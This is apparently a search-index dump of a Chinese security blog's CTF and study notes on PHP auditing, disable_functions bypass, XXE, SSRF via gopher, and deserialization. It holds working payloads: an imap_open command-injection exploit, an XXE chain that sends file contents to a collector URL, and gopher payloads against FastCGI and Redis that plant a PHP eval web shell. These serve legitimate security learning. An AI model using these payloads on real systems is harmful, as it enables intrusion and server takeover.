“.*?”匹配一个字符”a”,并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯。 PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。 当超过回溯次数上限后，函数返回值会变成false而不是0或者1。可以利用这个漏洞绕过正则匹配，上传一句话木马。 \u003c?php $a = '\u003c?php phpinfo();//'.str_repeat('a', 9999996);\rfile_put_contents('exp.php', $a);\r?\u003e\r","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x07 Disable_function绕过 黑名单绕过 phpinfo的disable_functions显示禁用的函数，不在列表之中，例如system exec shell_exec等被禁用了，但是可以用assert等代替。或者scandir等用其他函数实现需要的功能。 扩展使用 windows下COM（系统组件） \u003c?php $command = $_GET['a'];\r$wsh = new COM('WScript.shell');//生成一个COM对象 Shell.Application也可\r$exec = $wsh-\u003eexec(\"cmd /c\".$command);//调用对象方法来执行命令\r$stdout = $exec-\u003eStdOut();\r$stroutput = $stdout-\u003eReadALL();\recho $stroutput;\r?\u003e\rpcntl 扩展 pcntl_exec ，在当前进程空间执行指定程序。 imap_open() imap_open ,Open an IMAP stream to a mailbox，公开的exp如下： \u003c?php\r$payload = \"echo fsfasaf|tee /tmp/2.txt\";\r$encoded = base64_encode($payload);\r$mailbox = \"any -o ProxyCommand=echo\\t\".$encoded.\"|base64\\t-d|bash\";\r@imap_open('{'.$mailbox.'}:143/imap}INBOX', '', '');\r?\u003e\r还有ImageMagic等，其实就是一些不在列表之中，但是又能执行命令的函数。 LD_PRELOAD LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 a.c gcc a.c -o a gcc -fPIC -shared b.c -o b.so，然后export LD_PRELOAD=\"./b.so\" strace -f php mail.php 2\u003e\u00261 | grep -A2 -B2 execve readelf -Ws /usr/sbin/sendmail ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x08 找源码、扫描、FUZZ 右键源代码\r代码压缩包泄漏\r.git源码\rhttps://github.com/lijiejie/GitHack\r.DS_Store泄漏\rhttps://github.com/lijiejie/ds_store_exp\rSVN代码泄漏\rhttps://github.com/kost/dvcs-ripper\r敏感信息--Robots.txt\r备份文件--Index.php.bak,Index.php.swp\rdirsearch、御剑等等 FUZZ例题 \u003c?php\r$action = $_GET['action'] ?? '';\r$arg = $_GET['arg'] ?? '';\rif(preg_match('/^[a-z0-9_]*$/isD', $action)) {\rshow_source(__FILE__);\r} else {\r$action('', $arg);\r}\rbp的intruder模块设置action=$%00$var_dump测试，%5c时通过。 ","date":"2021-04-25","objectID":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:9:0","tags":["Web安全","CTF"],"title":"安全牛PHP代码审计学习笔记","uri":"/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-04-13","objectID":"/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Web安全","CTF"],"title":"安全牛XXE学习笔记","uri":"/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 xml、dtd及blind xxe基础 XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 XML 指可扩展标记语言（Extensible Markup Language） XML 被设计用来传输和存储数据。 XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构。 语法规则： XML 文档必须有一个根元素 XML 元素都必须有一个关闭标签 XML 标签对大小敏感 XML 元素必须被正确的嵌套 XML 属性值必须加引导 范例： \u003c?xml version=\"1.0\" encoding=\"IS0-8859-1\"?\u003e\r\u003cnote\u003e\r\u003cto\u003eGeorge\u003c/to\u003e\r\u003cfrom\u003eJohn\u003c/from\u003e\r\u003cheading\u003eReminder\u003c/heading\u003e\r\u003cbody\u003eDont forget the meeting!\u003c/body\u003e\r\u003c/note\u003e\r实体引用 DTD（文档类型定义） DTD（文档类型定义）的作用是定义XML 文档的合法构建模块。 DTD 可以在XML 文档内声明，也可以外部引用。 内部声明：\u003c!DOCTYPE 根元素[元素声明]\u003e \u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE note[\r\u003c!ELEMENT note (to,from,heading,body)\u003e\r\u003c!ELEMENT to (#PCDATA)\u003e\r\u003c!ELEMENT from (#PCDATA)\u003e\r\u003c!ELEMENT heading (#PCDATA)\u003e\r\u003c!ELEMENT body (#PCDATA)\u003e\r]\u003e\r\u003cnote\u003e\r\u003cto\u003eGeorge\u003c/to\u003e\r\u003cfrom\u003eJohn\u003c/from\u003e\r\u003cheading\u003eReminder\u003c/heading\u003e\r\u003cbody\u003eDon't forget the meeting!\u003c/body\u003e\r\u003c/note\u003e\rPCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。 外部声明：\u003c!DOCTYPE 根元素SYSTEM \"文件名\"\u003e \u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE note SYSTEM \"note.dtd\"\u003e\r\u003cnote\u003e\r\u003cto\u003eGeorge\u003c/to\u003e\r\u003cfrom\u003eJohn\u003c/from\u003e\r\u003cheading\u003eReminder\u003c/heading\u003e\r\u003cbody\u003eDon't forget the meeting!\u003c/body\u003e\r\u003c/note\u003e\rDTD实体构建方式：内部实体声明 \u003c!ENTITY entity-name \"entity-value\"\u003e \u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE mail[\r\u003c!ELEMENT mail (message)\u003e\r\u003c!ENTITY hacker \"hacker's data\"\u003e\r]\u003e\r\u003cmail\u003e\r\u003cmessage\u003e\u0026hacker; \u003c/message\u003e\r\u003c/mail\u003e\rDTD实体构建方式：外部实体声明 \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e \u003c?xml version=\"1.0\"?\u003e\r\u003c!DOCTYPE mail[\r\u003c!ELEMENT mail (message)\u003e\r\u003c!ENTITY hacker SYSTEM \"file:///C:/Windows/win.ini\"\u003e\r]\u003e\r\u003cmail\u003e\r\u003cmessage\u003e\u0026hacker; \u003c/message\u003e\r\u003c/mail\u003e\r外部声明默认协议及php扩展协议 参数实体 参数实体只用于DTD 和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体. 参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容。 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE root [\r\u003c!ELEMENT root (message)\u003e\r\u003c!ENTITY % param1 \"\u003c!ENTITY internal 'http://xxx.com'\u003e\"\u003e\r%param1;\r]\u003e\r\u003croot\u003e\r\u003cmessage\u003e\u0026internal;\u003c/message\u003e\r\u003c/root\u003e\r简单利用 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!DOCTYPE foo [\r\u003c!ELEMENT foo ANY \u003e\r\u003c!ENTITY % evil SYSTEM \"file:////phpstudy/WwW/bull/xxe/xml/flag.txt\" \u003e\r\u003c!ENTITY % xxe SYSTEM \"http://172.16.206.99/bull/xxe/xm1/dtd7_2.xml\" \u003e\r%xxe;\r%all;\r]\u003e\r\u003cfoo\u003e\u0026send;\u003c/foo\u003e\r\u003c!ENTITY % all \"\u003c!ENTITY send SYSTEM 'http://172.16.206.99/class/xss_get_cookie/hacker.php?\rcookie=%evil;'\u003e\"\u003e ","date":"2021-04-13","objectID":"/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛XXE学习笔记","uri":"/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 前言 菜鸡记录汇总下SSRF的学习过程，这个题目设置的难度不合理，后四题贼简单，难度却最高。。。，就离谱。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:1:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x01 内网访问 题目：尝试访问位于127.0.0.1的flag.php吧 启动环境，url显示xxxx/?url=_，SSRF(Server-SideRequestForgery)是服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。这道题，我们可以指定URL地址从而获取网页文本内容，所以直接改成127.0.0.1/flag.php即可。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:2:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x02 伪协议读取文件 题目：尝试去读取一下Web目录下的flag.php吧 Web目录的路径是/var/www/html/，启动环境，url显示xxxx/?url=_，这题的考点应该是利用file协议读取本地文件，改为file:///var/www/html/flag.php，出现三个？，查看源代码，即可得到flag。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:3:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x03 端口扫描 题目：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦 使用Burp设置/?url=127.0.0.1:§8000§，在intruder设置PayLoad Type为number，From：8000To：9000，Step：1。发现在8462端口，长度有明显差异。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:4:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x04 POST请求 题目：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 直接访问flag.php显示，Just View From 127.0.0.1，构造url变量，访问url/?url=http://127.0.0.1/flag.php，出现一个输入框，查看源码。 302是重定向又称之为暂时性转移，一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。不过302.php访问不了，不知道为啥。 输入url?url=file:///var/www/html/flag.php查看下源代码，可以发现需要post一个key值。 需要利用gopher协议来构造post请求，post的数据包的格式大致如下： POST /flag.php HTTP/1.1\rHost: 127.0.0.1:80\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 36\rkey=882ba9ee8557373dce7b058bb80ed9d6\r将上面的POST数据包先进行1次URL编码,URL编码的次数主要取决于你请求的次数，然后换行符是%0d%0a，把%0A替换成%0d%0A，结尾补上%0d%0A。 POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=882ba9ee8557373dce7b058bb80ed9d6%0d%0A 再进行一次URL编码 POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=882ba9ee8557373dce7b058bb80ed9d6%250d%250A 最后的利用curl 补充知识： -v 详细（在事件循环中打印错误/警告）\r-vv 非常详细（也打印客户端命令/ reponses ）\r-vvv 非常详细（也打印内部状态转换）\r","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:5:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x05 上传文件 题目：这次需要上传一个文件到flag.php了.祝你好运。 构造url?url=http://127.0.0.1/flag.php 再利用file协议读一下源代码。 编辑下html，然后上传一个非空文件。 \u003cform action=\"/flag.php\" method=\"post\" enctype=\"multipart/form-data\"\u003e\r\u003cinput type=\"file\" name=\"file\"\u003e\r\u003cinput type=\"submit\" value=\"上传\"\u003e\r\u003c/form\u003e\r利用bp抓包，出现Just View From 127.0.0.1。 POST /flag.php HTTP/1.1\rHost: challenge-839040a464e49915.sandbox.ctfhub.com:10800\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: multipart/form-data; boundary=---------------------------41538798404609826121560554440\rContent-Length: 218\rOrigin: http://challenge-839040a464e49915.sandbox.ctfhub.com:10800\rConnection: keep-alive\rReferer: http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php\rUpgrade-Insecure-Requests: 1\r-----------------------------41538798404609826121560554440\rContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\rContent-Type: text/plain\r123\r-----------------------------41538798404609826121560554440--\r经过一次url编码，%0A全部替换成%0d%0A POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20challenge-839040a464e49915.sandbox.ctfhub.com:10800%0d%0AUser-Agent:%20Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:91.0)%20Gecko/20100101%20Firefox/91.0%0d%0AAccept:%20text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%0d%0AAccept-Language:%20zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%0d%0AAccept-Encoding:%20gzip,%20deflate%0d%0AContent-Type:%20multipart/form-data;%20boundary=---------------------------41538798404609826121560554440%0d%0AContent-Length:%20218%0d%0AOrigin:%20http://challenge-839040a464e49915.sandbox.ctfhub.com:10800%0d%0AConnection:%20keep-alive%0d%0AReferer:%20http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%0d%0AUpgrade-Insecure-Requests:%201%0d%0A%0d%0A-----------------------------41538798404609826121560554440%0d%0AContent-Disposition:%20form-data;%20name=%22file%22;%20filename=%221.txt%22%0d%0AContent-Type:%20text/plain%0d%0A%0d%0A123%0d%0A-----------------------------41538798404609826121560554440--%0d%0A 再经过一次url编码 POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520challenge-839040a464e49915.sandbox.ctfhub.com:10800%250d%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:91.0)%2520Gecko/20100101%2520Firefox/91.0%250d%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%250d%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250d%250AAccept-Encoding:%2520gzip,%2520deflate%250d%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------41538798404609826121560554440%250d%250AContent-Length:%2520218%250d%250AOrigin:%2520http://challenge-839040a464e49915.sandbox.ctfhub.com:10800%250d%250AConnection:%2520keep-alive%250d%250AReferer:%2520http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%250d%250AUpgrade-Insecure-Requests:%25201%250d%250A%250d%250A-----------------------------41538798404609826121560554440%250d%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%25221.txt%2522%250d%250AContent-Type:%2520text/plain%250d%250A%250d%250A123%250d%250A-----------------------------41538798404609826121560554440--%250d%250A 使用gopher协议访问，成功得到flag。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:6:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x06 FastCGI协议 题目：这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助 提供了一个附件https://blog.csdn.net/mysteryflower/article/details/94386461，这里同样参考了https://www.soapffz.com/sec/ctf/566.html Nginx（IIS7）解析漏洞 在用户访问 http://127.0.0.1/favicon.ico/.php 时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了，而这个指定的文件涉及到的关键变量为 “SCRIPT_FILENAME”；正常来说，SCRIPT_FILENAME 的值是一个不存在的文件 /var/www/html/favicon.ico/.php，是 PHP 设置中的一个选项 fix_pathinfo 导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 fix_pathinfo，在这个选项被打开的情况下，fpm 会判断 SCRIPT_FILENAME 是否存在，如果不存在则去掉最后一个 / 及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。 PHP-FPM未授权访问漏洞 PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。 在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions： security.limit_extensions = .php .php3 .php4 .php5 .php7\r其限定了只有某些后缀的文件允许被fpm执行，默认是.php。所以，当我们再传入/etc/passwd的时候，将会返回Access denied。 由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。 万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用find / -name \"*.php\"来全局搜索一下默认环境，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如/usr/local/lib/php/PEAR.php。 任意代码执行 PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。 假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include） PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中） 环境变量： {\r'GATEWAY_INTERFACE': 'FastCGI/1.0',\r'REQUEST_METHOD': 'GET',\r'SCRIPT_FILENAME': '/var/www/html/index.php',\r'SCRIPT_NAME': '/index.php',\r'QUERY_STRING': '?a=1\u0026b=2',\r'REQUEST_URI': '/index.php?a=1\u0026b=2',\r'DOCUMENT_ROOT': '/var/www/html',\r'SERVER_SOFTWARE': 'php/fcgiclient',\r'REMOTE_ADDR': '127.0.0.1',\r'REMOTE_PORT': '12345',\r'SERVER_ADDR': '127.0.0.1',\r'SERVER_PORT': '80',\r'SERVER_NAME': \"localhost\",\r'SERVER_PROTOCOL': 'HTTP/1.1'\r'PHP_VALUE': 'auto_prepend_file = php://input',\r'PHP_ADMIN_VALUE': 'allow_url_include = On'\r}\r设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 EXP：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 usage: fpm.py [-h] [-c CODE] [-p PORT] host file\r执行命令 python3 fpm.py -c \"\u003c?php var_dump(shell_exec('ls /'));?\u003e\" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php\r利用hexdump或xxd查看数据流和元数据。 提出来后进行url编码 gopher://127.0.0.1:9000/_%2501%2501%2542%2549%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2542%2549%2501%25e7%2500%2500%250e%2502%2543%254f%254e%2554%2545%254e%2554%255f%254c%2545%254e%2547%2554%2548%2533%2537%250c%2510%2543%254f%254e%2554%2545%254e%2554%255f%2554%2559%2550%2545%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2574%2565%2578%2574%250b%2504%2552%2545%254d%254f%2554%2545%255f%2550%254f%2552%2554%2539%2539%2538%2535%250b%2509%2553%2545%2552%2556%2545%2552%255f%254e%2541%254d%2545%256c%256f%2563%2561%256c%2568%256f%2573%2574%2511%250b%2547%2541%2554%2545%2557%2541%2559%255f%2549%254e%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252f%2531%252e%2530%250f%250e%2553%2545%2552%2556%2545%2552%255f%2553%254f%2546%2554%2557%2541%2552%2545%2570%2568%2570%252f%2566%2563%2567%2569%2563%256c%2569%2565%256e%2574%250b%2509%2552%2545%254d%254f%2554%2545%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%252e%2531%250f%251b%2553%2543%2552%2549%2550%2554%255f%2546%2549%254c%2545%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%250b%251b%2553%2543%2552%2549%2550%2554%255f%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%2509%251f%2550%2548%2550%255f%2556%2541%254c%2555%2545%2561%2575%2574%256f%255f%2570%2572%2565%2570%2565%256e%2564%255f%2566%2569%256c%2565%2520%253d%2520%2570%2568%2570%253","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:7:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x07 Redis协议 题目：这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找! 参考https://xz.aliyun.com/t/5665 import urllib\rprotocol=\"gopher://\"\rip=\"127.0.0.1\"\rport=\"6379\"\rshell=\"\\n\\n\u003c?php eval($_GET[\\\"cmd\\\"]);?\u003e\\n\\n\"\rfilename=\"shell.php\"\rpath=\"/var/www/html\"\rpasswd=\"\"\rcmd=[\"flushall\",\r\"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\r\"config set dir {}\".format(path),\r\"config set dbfilename {}\".format(filename),\r\"save\"\r]\rif passwd:\rcmd.insert(0,\"AUTH {}\".format(passwd))\rpayload=protocol+ip+\":\"+port+\"/_\"\rdef redis_format(arr):\rCRLF=\"\\r\\n\"\rredis_arr = arr.split(\" \")\rcmd=\"\"\rcmd+=\"*\"+str(len(redis_arr))\rfor x in redis_arr:\rcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\rcmd+=CRLF\rreturn cmd\rif __name__==\"__main__\":\rfor x in cmd:\rpayload += urllib.parse.quote(redis_format(x))\rprint (payload)\r再经过url编码 gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 执行url/shell.php?cmd=system('find / -name flag*');，找到可疑文件。 cat一下就出来flag了。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:8:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x08 URL Bypass 题目：请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧 构造url?url=http://notfound.ctfhub.com@127.0.0.1/flag.php ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:9:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x09 数字IP Bypass 题目：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢 转换成16进制，构造url?url=0x7f000001/flag.php ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:10:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x0A 302跳转 Bypass 题目：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧 先直接构造url?url=127.0.0.1/flag.php访问 改成localhost，成功。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:11:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x0B DNS重绑定 Bypass 关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助 提供了一个附件：https://zhuanlan.zhihu.com/p/89426041 答案参考附件就出来了。 ","date":"2021-04-11","objectID":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/:12:0","tags":["Web安全","CTF"],"title":"CTFHub-SSRF学习","uri":"/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-04-08","objectID":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Web安全","CTF"],"title":"安全牛反序列化学习笔记","uri":"/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 反序列化的基本概念 序列化和反序列化的目的是使得程序间传输对象会更加方便。 内存数据是“稍纵即逝”的；——通常，程序执行结束，立即全部销毁。变量所存储的数据，就是内存数据；文件是“持久数据”； 序列化就是，将内存的变量数据，“保存”到文件中的持久数据的过程。简化就是：将内存变为文件。 反序列化就是，将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程。简化就是：将文件变为内存。 相关函数 serialize — 产生一个可存储的值的表示 serialize(mixed$value): string serialize() 返回字符串，此字符串包含了表示 value 